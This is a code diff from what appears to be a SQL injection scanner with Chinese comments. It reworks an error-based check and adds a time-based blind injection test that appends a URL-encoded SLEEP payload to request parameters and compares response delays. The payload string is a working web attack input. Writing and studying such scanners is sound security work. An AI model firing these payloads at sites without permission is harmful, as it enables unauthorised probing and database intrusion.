@@ -25,30 +25,48 @@ class ErrorInject(SqlInject, Check):
 				r'MySqlClient\.',
 				r'com\.mysql\.jdbc\.exceptions']
 	
-	def _initialization_request(self, inject):
-		result = []
-		#有参数
-		if inject.params:
-			for key in inject.params:
-				if not inject.exp_req['params'].has_key(key):
-					inject.exp_req['params'][key] = []
-				for payload in self._payloads:
-					tmp = deepcopy(inject.params)
-					tmp[key] += payload
-					inject.exp_req['params'][key].append(tmp)
-		else:
-			#无参数
-			for payload in self._payloads:
-				inject.exp_req['urls'].append(inject.url + payload)
-		return inject
-	
-	def _check_content(self, content):
+	def _check(self, inject):
 		for error in self.__errors:
-			if re.search(error, content, re.I):
+			if re.search(error, inject.content, re.I):
 				return error
 		
-class TimeInject(SqlInject):
-	pass
-
+class TimeInject(SqlInject, Check):
+	
+	def __init__(self):
+		#测试正常响应时间的次数
+		self.__test_num = 3
+		#响应时间平均数
+		self.__mean = 0
+		#秒
+		self.time = [4, 5, 6]
+	
+	def _load_payloads(self):
+		payloads_raw = ['%27%20AND%20SLEEP({time})%20AND%20%27TgYR%27%3d%27TgYR']
+		payloads = []
+		for i in range(0, self.__test_num):
+			payloads.append('')
+		for i in range(2, len(payloads)):
+			for t in self.time:
+				for y in range(0, len(payloads_raw)):
+					payloads.append(payloads_raw[y].replace('{time}',str(t)))
+		return payloads
+	
+	def get_timeout(self):
+		return 7
+	
+	def _check(self, inject):
+		diff = inject.time_diff()
+		#计算平均值
+		if self.__test_num > 0:
+			if not self.__mean:
+				self.__mean = diff
+			self.__mean = (self.__mean + diff)/2
+		else:
+			#时间差大于最小的sleep时间则是时间盲注
+			self.__test_num = 3
+			#TODO 判断不准确，下版本升级
+			return (diff - self.__mean) >= self.time[0]
+		self.__test_num -= 1
+		
 class UnionInject(SqlInject):
 	pass
